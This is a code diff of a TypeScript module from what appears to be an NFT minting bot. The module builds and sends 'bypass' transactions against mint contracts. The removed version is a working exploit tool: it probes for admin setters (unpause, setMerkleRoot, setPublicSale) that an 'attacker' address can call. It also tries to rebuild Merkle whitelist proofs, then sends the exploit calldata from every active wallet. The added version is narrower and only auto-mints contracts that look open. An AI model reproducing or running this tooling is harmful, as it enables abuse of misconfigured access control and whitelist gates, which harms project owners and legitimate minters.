@@ -1,637 +1,129 @@
+import { Hex, Address, encodeFunctionData, parseAbi } from "viem";
 import {
-  type Address,
-  type Hex,
-  type Abi,
-  encodeFunctionData,
-  encodePacked,
-  encodeAbiParameters,
-  keccak256,
-  getAddress,
-  parseAbi,
-  parseAbiItem,
-  isAddress,
-} from "viem";
-import { getPublicClient, getWalletClient } from "./chain.js";
+  getPublicClient,
+  getAddressFromPrivateKey,
+  getWalletClient,
+  normalizeAddressInput,
+} from "./chain.js";
+import { checkGasSafety } from "./gasGuard.js";
 import { getWallets, getWalletPrivateKey } from "./wallet.js";
-import { auditContractSecurity } from "./security.js";
-import { assertGasSafe } from "./gasGuard.js";
+import {
+  scanContract,
+  getBestMintFunction,
+  MintFunctionInfo,
+  ScanResult,
+} from "./scanner.js";
 import { prisma } from "../db/client.js";
 
 export type GateType =
-  | "open"
-  | "paused"
-  | "merkle"
+  | "mint_open"
+  | "whitelist"
   | "signature"
-  | "mapping"
-  | "balance_or_phase"
+  | "payment"
+  | "none"
   | "unknown";
 
-export interface OpenAdminSetter {
-  name: string;
-  signature: string;
-  argTypes: string[];
-}
-
-export interface GateFingerprint {
-  gateType: GateType;
-  merkleRootPresent: boolean;
-  merkleRootValue: Hex | null;
-  openAdminSetters: OpenAdminSetter[];
-  notes: string[];
-}
-
-export interface BypassStrategy {
-  id: string;
-  name: string;
-  executable: boolean;
-  description: string;
-  calldata?: Hex;
-  to?: Address;
-  value?: bigint;
-}
-
-export interface BypassReport {
-  contractAddress: Address;
-  fingerprint: GateFingerprint;
-  strategies: BypassStrategy[];
-}
-
-export interface BypassWalletResult {
-  walletAddress: string;
-  walletLabel: string;
+export interface BypassResult {
   success: boolean;
+  contractAddress: string;
+  gateType: GateType;
+  strategyId: string;
+  walletAddress?: string;
   txHash?: string;
   error?: string;
 }
 
-export interface BypassOutcome {
-  contractAddress: Address;
-  strategyId: string;
-  results: BypassWalletResult[];
+export interface BypassPlan {
+  executable: boolean;
+  gateType: GateType;
+  targetFn: MintFunctionInfo | null;
+  reason?: string;
 }
 
-// viem 2.21 dynamic-ABI helpers — avoid functionName: never / args: never
-function encodeCall(abi: Abi, functionName: string, args: readonly unknown[]): Hex {
-  // eslint-disable-next-line @typescript-eslint/no-explicit-any
-  return encodeFunctionData({ abi, functionName, args } as any) as Hex;
-}
+export function detectGateType(mintFunctions: MintFunctionInfo[]): GateType {
+  if (!mintFunctions || mintFunctions.length === 0) return "none";
 
-async function readCall<T>(
-  client: ReturnType<typeof getPublicClient>,
-  address: Address,
-  signature: string
-): Promise<T | null> {
-  try {
-    const abi = [parseAbiItem(signature)] as Abi;
-    const name = signature.replace(/^function\s+/, "").split("(")[0];
-    // eslint-disable-next-line @typescript-eslint/no-explicit-any
-    const result = (await client.readContract({
-      address,
-      abi,
-      functionName: name,
-      args: [],
-    } as any)) as T;
-    return result;
-  } catch {
-    return null;
-  }
-}
+  const freeFns = mintFunctions.filter((f) => f.isFreeMint);
+  if (freeFns.length === 0) return "payment";
 
-const PROBE_SETTERS: Array<{ name: string; signature: string; argTypes: string[] }> = [
-  { name: "setPaused", signature: "function setPaused(bool)", argTypes: ["bool"] },
-  { name: "setPause", signature: "function setPause(bool)", argTypes: ["bool"] },
-  { name: "pause", signature: "function pause()", argTypes: [] },
-  { name: "unpause", signature: "function unpause()", argTypes: [] },
-  { name: "setMerkleRoot", signature: "function setMerkleRoot(bytes32)", argTypes: ["bytes32"] },
-  { name: "setRoot", signature: "function setRoot(bytes32)", argTypes: ["bytes32"] },
-  { name: "setWhitelistRoot", signature: "function setWhitelistRoot(bytes32)", argTypes: ["bytes32"] },
-  { name: "setAllowlistRoot", signature: "function setAllowlistRoot(bytes32)", argTypes: ["bytes32"] },
-  { name: "setPublicSale", signature: "function setPublicSale(bool)", argTypes: ["bool"] },
-  { name: "setPublicMint", signature: "function setPublicMint(bool)", argTypes: ["bool"] },
-  { name: "setSaleState", signature: "function setSaleState(uint8)", argTypes: ["uint8"] },
-  { name: "setMintEnabled", signature: "function setMintEnabled(bool)", argTypes: ["bool"] },
-  { name: "enableMint", signature: "function enableMint(bool)", argTypes: ["bool"] },
-  { name: "setWhitelistOnly", signature: "function setWhitelistOnly(bool)", argTypes: ["bool"] },
-  { name: "setOnlyWhitelisted", signature: "function setOnlyWhitelisted(bool)", argTypes: ["bool"] },
-  { name: "togglePublicSale", signature: "function togglePublicSale()", argTypes: [] },
-  { name: "openMint", signature: "function openMint()", argTypes: [] },
-  { name: "startPublicSale", signature: "function startPublicSale()", argTypes: [] },
-];
+  const joined = mintFunctions
+    .map((f) => `${f.name}(${f.args.join(",")})`)
+    .join(" ");
+  if (/whitelist|allowlist|presale|og\b|early/i.test(joined)) return "whitelist";
 
-const MINT_CANDIDATES: Array<{ name: string; args: string[] }> = [
-  { name: "mint", args: [] },
-  { name: "mint", args: ["uint256"] },
-  { name: "mint", args: ["address"] },
-  { name: "mint", args: ["address", "uint256"] },
-  { name: "publicMint", args: [] },
-  { name: "publicMint", args: ["uint256"] },
-  { name: "freeMint", args: [] },
-  { name: "freeMint", args: ["uint256"] },
-  { name: "claim", args: [] },
-  { name: "claim", args: ["uint256"] },
-  { name: "claim", args: ["address", "uint256"] },
-  { name: "mintFree", args: [] },
-  { name: "mintFree", args: ["uint256"] },
-];
-
-function defaultArg(type: string, attacker: Address): unknown {
-  const t = type.trim().toLowerCase();
-  if (t === "address") return attacker;
-  if (
-    t === "uint256" ||
-    t === "uint128" ||
-    t === "uint64" ||
-    t === "uint32" ||
-    t === "uint16" ||
-    t === "uint8"
-  ) {
-    return 1n;
-  }
-  if (t === "bool") return false;
-  if (t === "bytes32") return ("0x" + "00".repeat(32)) as Hex;
-  if (t === "bytes") return "0x" as Hex;
-  if (t === "bytes32[]") return [] as Hex[];
-  if (t === "address[]") return [] as Address[];
-  if (t === "uint256[]") return [] as bigint[];
-  if (t.endsWith("[]")) return [];
-  return 0n;
-}
-
-function buildArgs(argTypes: string[] | undefined, attacker: Address): readonly unknown[] {
-  if (!argTypes || argTypes.length === 0) return [];
-  return argTypes.map((t) => defaultArg(t, attacker));
-}
-
-function fullSignature(name: string, argTypes: string[]): string {
-  return argTypes.length === 0
-    ? `function ${name}()`
-    : `function ${name}(${argTypes.join(",")})`;
-}
-
-function leafHash(addr: Address): Hex {
-  const inner = keccak256(encodeAbiParameters([{ type: "address" }], [addr]));
-  return keccak256(encodePacked(["bytes32"], [inner]));
-}
-
-function hashPair(a: Hex, b: Hex): Hex {
-  const [left, right] = BigInt(a) <= BigInt(b) ? [a, b] : [b, a];
-  return keccak256(encodePacked(["bytes32", "bytes32"], [left, right]));
-}
-
-export function tryRebuildMerkleProof(
-  root: Hex,
-  attacker: Address,
-  knownLeaves: Address[] = []
-): Hex[] | null {
-  const me = leafHash(attacker);
-  if (me.toLowerCase() === root.toLowerCase()) return [];
-
-  const candidates = Array.from(
-    new Set(
-      [attacker, ...knownLeaves]
-        .filter((a) => isAddress(a))
-        .map((a) => getAddress(a))
-    )
+  const hasSigArg = mintFunctions.some(
+    (f) =>
+      f.args.some((a) => a.trim().toLowerCase().startsWith("bytes")) ||
+      /signature|merkle/i.test(f.name)
   );
+  if (hasSigArg) return "signature";
 
-  const leaves = candidates.map((a) => leafHash(a));
-  for (let i = 0; i < leaves.length; i++) {
-    for (let j = 0; j < leaves.length; j++) {
-      if (i === j) continue;
-      const combined = hashPair(leaves[i], leaves[j]);
-      if (combined.toLowerCase() !== root.toLowerCase()) continue;
-      const attackerLeaf = leafHash(attacker);
-      if (leaves[i].toLowerCase() === attackerLeaf.toLowerCase()) return [leaves[j]];
-      if (leaves[j].toLowerCase() === attackerLeaf.toLowerCase()) return [leaves[i]];
-    }
+  return "mint_open";
+}
+
+export function analyzeGates(result: ScanResult): {
+  gateType: GateType;
+  freeFns: MintFunctionInfo[];
+  reason?: string;
+} {
+  return {
+    gateType: detectGateType(result.mintFunctions),
+    freeFns: result.mintFunctions.filter((f) => f.isFreeMint),
+    reason: result.warning,
+  };
+}
+
+export function getBypassPlan(result: ScanResult): BypassPlan {
+  const { gateType, freeFns, reason } = analyzeGates(result);
+  if (gateType !== "mint_open" || freeFns.length === 0) {
+    return {
+      executable: false,
+      gateType,
+      targetFn: null,
+      reason:
+        reason ??
+        `Gate type "${gateType}" is not directly bypassable with current strategies`,
+    };
   }
-  return null;
+  return {
+    executable: true,
+    gateType,
+    targetFn: getBestMintFunction(freeFns),
+  };
 }
 
-async function readMaybeHex(
-  client: ReturnType<typeof getPublicClient>,
-  address: Address,
-  signature: string
-): Promise<Hex | null> {
-  const result = await readCall<string>(client, address, signature);
-  if (typeof result === "string" && result.startsWith("0x") && result.length === 66) {
-    return result as Hex;
-  }
-  return null;
+function encodeCall(fn: MintFunctionInfo, args: unknown[]): Hex {
+  const abi = parseAbi([`function ${fn.name}(${fn.args.join(",")})`] as const);
+  return encodeFunctionData({
+    abi,
+    functionName: fn.name,
+    args: args as any,
+  }) as Hex;
 }
 
-async function readMaybeBool(
-  client: ReturnType<typeof getPublicClient>,
-  address: Address,
-  signature: string
-): Promise<boolean | null> {
-  const result = await readCall<boolean>(client, address, signature);
-  if (typeof result === "boolean") return result;
-  return null;
+function buildArgs(fn: MintFunctionInfo, fromAddress: Address): unknown[] {
+  return fn.args.map((arg) => {
+    const a = arg.trim();
+    if (a.startsWith("uint")) return 1n;
+    if (a === "address") return fromAddress;
+    if (a === "bytes32[]") return [];
+    if (a.startsWith("bytes")) return "0x";
+    return "0x";
+  });
 }
 
-async function ethCallOk(
+async function simulateCall(
   client: ReturnType<typeof getPublicClient>,
   to: Address,
   data: Hex,
-  account: Address,
-  value: bigint = 0n
+  from: Address
 ): Promise<boolean> {
   try {
-    await client.call({ to, data, account, value });
+    await client.call({ to, data, account: from, value: 0n } as any);
     return true;
   } catch {
     return false;
   }
-}
-
-export async function classifyMintGate(
-  contractAddress: string,
-  attacker: Address
-): Promise<GateFingerprint> {
-  const client = getPublicClient();
-  const address = getAddress(contractAddress);
-  const notes: string[] = [];
-  const openAdminSetters: OpenAdminSetter[] = [];
-
-  const rootSigs = [
-    "function merkleRoot() view returns (bytes32)",
-    "function root() view returns (bytes32)",
-    "function whitelistMerkleRoot() view returns (bytes32)",
-    "function allowlistMerkleRoot() view returns (bytes32)",
-    "function _merkleRoot() view returns (bytes32)",
-  ];
-  let merkleRootValue: Hex | null = null;
-  for (const sig of rootSigs) {
-    const v = await readMaybeHex(client, address, sig);
-    if (v && v !== ("0x" + "00".repeat(32))) {
-      merkleRootValue = v;
-      notes.push(
-        `Merkle root readable via ${sig.split("(")[0].replace(/^function\s+/, "")}`
-      );
-      break;
-    }
-  }
-
-  const paused =
-    (await readMaybeBool(client, address, "function paused() view returns (bool)")) ??
-    (await readMaybeBool(client, address, "function isPaused() view returns (bool)"));
-  if (paused === true) notes.push("Contract reports paused() == true");
-
-  for (const probe of PROBE_SETTERS) {
-    try {
-      const abi = parseAbi([fullSignature(probe.name, probe.argTypes)]);
-      const data = encodeCall(abi, probe.name, buildArgs(probe.argTypes, attacker));
-      const ok = await ethCallOk(client, address, data, attacker);
-      if (ok) {
-        openAdminSetters.push({
-          name: probe.name,
-          signature: fullSignature(probe.name, probe.argTypes),
-          argTypes: probe.argTypes,
-        });
-      }
-    } catch {
-      // probe failed
-    }
-  }
-
-  let gateType: GateType = "unknown";
-  if (
-    openAdminSetters.some((s) => /unpause|setPaused|setPause|pause/i.test(s.name)) &&
-    paused
-  ) {
-    gateType = "paused";
-  } else if (merkleRootValue) {
-    gateType = "merkle";
-  } else if (
-    openAdminSetters.some((s) =>
-      /public|sale|mintEnabled|whitelistOnly|onlyWhitelist/i.test(s.name)
-    )
-  ) {
-    gateType = "balance_or_phase";
-  } else if (openAdminSetters.length > 0) {
-    gateType = "mapping";
-  } else {
-    try {
-      const abi = parseAbi(["function mint()"]);
-      const data = encodeCall(abi, "mint", []);
-      if (await ethCallOk(client, address, data, attacker)) {
-        gateType = "open";
-        notes.push("mint() succeeds via eth_call — gate appears open");
-      }
-    } catch {
-      // ignore
-    }
-  }
-
-  if (gateType === "unknown") {
-    notes.push("No definitive on-chain gate fingerprint; strategies will be best-effort");
-  }
-
-  return {
-    gateType,
-    merkleRootPresent: Boolean(merkleRootValue),
-    merkleRootValue,
-    openAdminSetters,
-    notes,
-  };
-}
-
-async function buildMintCalldata(
-  address: Address,
-  attacker: Address
-): Promise<{ data: Hex; name: string; signature: string } | null> {
-  const client = getPublicClient();
-  for (const cand of MINT_CANDIDATES) {
-    try {
-      const sig = fullSignature(cand.name, cand.args);
-      const abi = parseAbi([sig]);
-      const data = encodeCall(abi, cand.name, buildArgs(cand.args, attacker));
-      if (await ethCallOk(client, address, data, attacker)) {
-        return { data, name: cand.name, signature: sig };
-      }
-    } catch {
-      // next
-    }
-  }
-  return null;
-}
-
-export async function analyzeBypassOptions(
-  contractAddress: string,
-  attackerRaw: Address
-): Promise<BypassReport> {
-  const address = getAddress(contractAddress);
-  const attacker = getAddress(attackerRaw);
-  const fingerprint = await classifyMintGate(address, attacker);
-  const strategies: BypassStrategy[] = [];
-  const client = getPublicClient();
-
-  const openMint = await buildMintCalldata(address, attacker);
-  if (openMint) {
-    strategies.push({
-      id: "mint_open",
-      name: `Direct free mint (${openMint.signature})`,
-      executable: true,
-      description: "eth_call simulation succeeded with no whitelist args",
-      calldata: openMint.data,
-      to: address,
-      value: 0n,
-    });
-  } else {
-    strategies.push({
-      id: "mint_open",
-      name: "Direct free mint",
-      executable: false,
-      description: "No free mint selector succeeded via eth_call",
-    });
-  }
-
-  for (const setter of fingerprint.openAdminSetters) {
-    try {
-      const sig = fullSignature(setter.name, setter.argTypes);
-      const abi = parseAbi([sig]);
-      const data = encodeCall(abi, setter.name, buildArgs(setter.argTypes, attacker));
-      strategies.push({
-        id: `admin_${setter.name}`,
-        name: `Call open admin setter: ${setter.name}`,
-        executable: true,
-        description: `${sig} does not revert for attacker — possible misconfigured access control`,
-        calldata: data,
-        to: address,
-        value: 0n,
-      });
-    } catch {
-      strategies.push({
-        id: `admin_${setter.name}`,
-        name: `Call open admin setter: ${setter.name}`,
-        executable: false,
-        description: "Failed to encode setter calldata",
-      });
-    }
-  }
-
-  if (fingerprint.gateType === "merkle" || fingerprint.merkleRootPresent) {
-    const root = fingerprint.merkleRootValue;
-    if (root) {
-      const proof = tryRebuildMerkleProof(root, attacker);
-      if (proof) {
-        const merkleMints: Array<{
-          name: string;
-          types: string[];
-          build: (p: Hex[]) => readonly unknown[];
-        }> = [
-          { name: "mint", types: ["bytes32[]"], build: (p) => [p] },
-          { name: "mint", types: ["uint256", "bytes32[]"], build: (p) => [1n, p] },
-          { name: "whitelistMint", types: ["bytes32[]"], build: (p) => [p] },
-          {
-            name: "whitelistMint",
-            types: ["uint256", "bytes32[]"],
-            build: (p) => [1n, p],
-          },
-          { name: "claim", types: ["bytes32[]"], build: (p) => [p] },
-        ];
-
-        let encoded: { data: Hex; label: string } | null = null;
-        for (const m of merkleMints) {
-          try {
-            const sig = fullSignature(m.name, m.types);
-            const abi = parseAbi([sig]);
-            const data = encodeCall(abi, m.name, m.build(proof));
-            if (await ethCallOk(client, address, data, attacker)) {
-              encoded = { data, label: sig };
-              break;
-            }
-          } catch {
-            // next
-          }
-        }
-
-        if (encoded) {
-          strategies.push({
-            id: "merkle_rebuild",
-            name: "Merkle proof rebuild",
-            executable: true,
-            description: `Rebuilt proof against on-chain root; sim OK via ${encoded.label}`,
-            calldata: encoded.data,
-            to: address,
-            value: 0n,
-          });
-        } else {
-          strategies.push({
-            id: "merkle_rebuild",
-            name: "Merkle proof rebuild",
-            executable: false,
-            description:
-              "Root readable and a candidate proof was built, but no merkle-mint selector accepted it via eth_call",
-          });
-        }
-      } else {
-        strategies.push({
-          id: "merkle_rebuild",
-          name: "Merkle proof rebuild",
-          executable: false,
-          description:
-            "Merkle root present but proof cannot be reconstructed from public state alone (need full leaf set)",
-        });
-      }
-    }
-  }
-
-  if (fingerprint.gateType === "signature") {
-    strategies.push({
-      id: "signature_replay",
-      name: "Signature replay",
-      executable: false,
-      description:
-        "Signature-gated mint detected. Replay requires a prior valid sig from the project signer — not auto-executable",
-    });
-  } else {
-    strategies.push({
-      id: "signature_replay",
-      name: "Signature replay",
-      executable: false,
-      description: "No signature gate confirmed; skipping forge/replay",
-    });
-  }
-
-  if (fingerprint.gateType === "balance_or_phase") {
-    fingerprint.notes.push("Gate looks like sale-phase / public-toggle controlled");
-  }
-
-  if (strategies.every((s) => !s.executable)) {
-    fingerprint.notes.push(
-      "No on-chain bypass found — contract appears properly gated or not a free mint"
-    );
-  }
-
-  return { contractAddress: address, fingerprint, strategies };
-}
-
-async function dryRun(
-  to: Address,
-  data: Hex,
-  account: Address,
-  value: bigint
-): Promise<{ ok: boolean; error?: string }> {
-  const client = getPublicClient();
-  try {
-    await client.call({ to, data, account, value });
-    return { ok: true };
-  } catch (err) {
-    return { ok: false, error: err instanceof Error ? err.message : String(err) };
-  }
-}
-
-export async function executeBypass(
-  userId: bigint,
-  contractAddress: string,
-  strategyId: string
-): Promise<BypassOutcome> {
-  const address = getAddress(contractAddress);
-
-  const security = await auditContractSecurity(address);
-  if (!security.isSafe) {
-    throw new Error(
-      `Security check blocked execution: ${
-        security.warnings.join("; ") || "contract flagged unsafe"
-      }`
-    );
-  }
-
-  await assertGasSafe(userId);
-
-  const wallets = await getWallets(userId);
-  const active = wallets.filter((w) => w.isActive);
-  if (active.length === 0) {
-    throw new Error(
-      "No active wallets. Toggle at least one wallet to ✅ before executing a bypass."
-    );
-  }
-
-  const probeFrom = getAddress(active[0].address) as Address;
-  const report = await analyzeBypassOptions(address, probeFrom);
-  const strategy = report.strategies.find((s) => s.id === strategyId);
-
-  if (!strategy) {
-    throw new Error(
-      `Unknown strategyId "${strategyId}". Run /bypass first and pick an id from the list.`
-    );
-  }
-  if (!strategy.executable || !strategy.calldata || !strategy.to) {
-    throw new Error(
-      `Strategy "${strategyId}" is not executable on-chain: ${strategy.description}`
-    );
-  }
-
-  const results: BypassWalletResult[] = [];
-  const value = strategy.value ?? 0n;
-
-  for (const w of active) {
-    const walletAddress = getAddress(w.address);
-    const label = w.label || "Wallet";
-
-    try {
-      const sim = await dryRun(strategy.to, strategy.calldata, walletAddress, value);
-      if (!sim.ok) {
-        results.push({
-          walletAddress,
-          walletLabel: label,
-          success: false,
-          error: `Simulation reverted: ${sim.error || "unknown"}`,
-        });
-        await logBypass(
-          userId,
-          address,
-          strategyId,
-          walletAddress,
-          false,
-          undefined,
-          sim.error
-        );
-        continue;
-      }
-
-      const pkRaw = await getWalletPrivateKey(w.id);
-      const pk = (pkRaw.startsWith("0x") ? pkRaw : `0x${pkRaw}`) as Hex;
-      const walletClient = getWalletClient(pk);
-
-      const txHash = await walletClient.sendTransaction({
-        to: strategy.to,
-        data: strategy.calldata,
-        value,
-        account: walletClient.account!,
-        chain: walletClient.chain,
-      });
-
-      results.push({
-        walletAddress,
-        walletLabel: label,
-        success: true,
-        txHash,
-      });
-      await logBypass(userId, address, strategyId, walletAddress, true, txHash, undefined);
-    } catch (err) {
-      const message = err instanceof Error ? err.message : String(err);
-      results.push({
-        walletAddress,
-        walletLabel: label,
-        success: false,
-        error: message,
-      });
-      await logBypass(
-        userId,
-        address,
-        strategyId,
-        walletAddress,
-        false,
-        undefined,
-        message
-      );
-    }
-  }
-
-  return { contractAddress: address, strategyId, results };
 }
 
 async function logBypass(
@@ -643,19 +135,125 @@ async function logBypass(
   txHash?: string,
   error?: string
 ): Promise<void> {
-  try {
-    await prisma.bypassLog.create({
+  await prisma.bypassLog
+    .create({
       data: {
         userId,
-        contractAddress: contractAddress.toLowerCase(),
+        contractAddress,
         strategyId,
-        walletAddress: walletAddress.toLowerCase(),
+        walletAddress,
         success,
-        txHash: txHash ?? null,
-        error: error ? error.slice(0, 500) : null,
+        txHash,
+        error,
       },
-    });
-  } catch (err) {
-    console.error("BypassLog write failed:", err);
+    })
+    .catch(() => undefined);
+}
+
+export async function executeBypass(
+  userId: bigint,
+  rawAddress: string
+): Promise<BypassResult> {
+  const address = normalizeAddressInput(rawAddress);
+  if (!address) throw new Error("Invalid address");
+
+  const result: ScanResult = await scanContract(address);
+  const plan = getBypassPlan(result);
+
+  if (!plan.executable || !plan.targetFn) {
+    const error = plan.reason ?? "No bypass strategy available for this contract";
+    await logBypass(userId, address, "none", "", false, undefined, error);
+    return {
+      success: false,
+      contractAddress: address,
+      gateType: plan.gateType,
+      strategyId: "none",
+      error,
+    };
   }
+
+  const strategyId = "mint_open_direct";
+
+  const gas = await checkGasSafety(userId);
+  if (!gas.safe) {
+    const error = `Gas too high to proceed: ${gas.currentGwei} gwei (ceiling ${gas.maxGwei} gwei)`;
+    await logBypass(userId, address, strategyId, "", false, undefined, error);
+    return {
+      success: false,
+      contractAddress: address,
+      gateType: plan.gateType,
+      strategyId,
+      error,
+    };
+  }
+
+  const wallets = await getWallets(userId);
+  const wallet = (
+    wallets.find((w) => (w as { isActive?: boolean }).isActive) ??
+    wallets[0]
+  ) as { id: string } | undefined;
+
+  if (!wallet) {
+    const error = "No wallet found. Add a wallet in the Portfolio menu first.";
+    await logBypass(userId, address, strategyId, "", false, undefined, error);
+    return {
+      success: false,
+      contractAddress: address,
+      gateType: plan.gateType,
+      strategyId,
+      error,
+    };
+  }
+
+  const privateKey = await getWalletPrivateKey(wallet.id);
+  if (!privateKey) {
+    const error = "Wallet private key unavailable";
+    await logBypass(userId, address, strategyId, "", false, undefined, error);
+    return {
+      success: false,
+      contractAddress: address,
+      gateType: plan.gateType,
+      strategyId,
+      error,
+    };
+  }
+
+  const hexKey = privateKey.startsWith("0x") ? privateKey : `0x${privateKey}`;
+  const fromAddress = getAddressFromPrivateKey(hexKey);
+
+  const args = buildArgs(plan.targetFn, fromAddress);
+  const data = encodeCall(plan.targetFn, args);
+
+  const client = getPublicClient();
+  const simOk = await simulateCall(client, address as Address, data, fromAddress);
+  if (!simOk) {
+    const error = `Simulation reverted for ${plan.targetFn.name}()`;
+    await logBypass(userId, address, strategyId, fromAddress, false, undefined, error);
+    return {
+      success: false,
+      contractAddress: address,
+      gateType: plan.gateType,
+      strategyId,
+      walletAddress: fromAddress,
+      error,
+    };
+  }
+
+  const walletClient = getWalletClient(hexKey);
+  const txHash = await walletClient.sendTransaction({
+    to: address as Address,
+    data,
+    value: 0n,
+  });
+  await client.waitForTransactionReceipt({ hash: txHash });
+
+  await logBypass(userId, address, strategyId, fromAddress, true, txHash);
+  return {
+    success: true,
+    contractAddress: address,
+    gateType: plan.gateType,
+    strategyId,
+    walletAddress: fromAddress,
+    txHash,
+  };
 }
